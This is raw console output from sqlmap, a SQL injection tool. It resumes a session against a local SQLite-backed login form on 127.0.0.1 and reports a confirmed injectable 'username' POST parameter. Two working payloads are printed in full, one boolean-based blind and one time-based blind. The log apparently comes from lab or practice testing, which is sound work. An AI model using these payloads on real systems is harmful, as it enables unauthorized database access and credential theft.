        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:00:22 /2026-07-28/

[18:00:22] [INFO] resuming back-end DBMS 'sqlite' 
[18:00:22] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: username=admin' AND CASE WHEN 1723=1723 THEN 1723 ELSE JSON(CHAR(112,77,68,88)) END AND 'fEwA'='fEwA&password=teste

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: username=admin' AND 6458=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'bKCb'='bKCb&password=teste
---
[18:00:22] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:00:22] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times
[18:00:22] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 18:00:22 /2026-07-28/

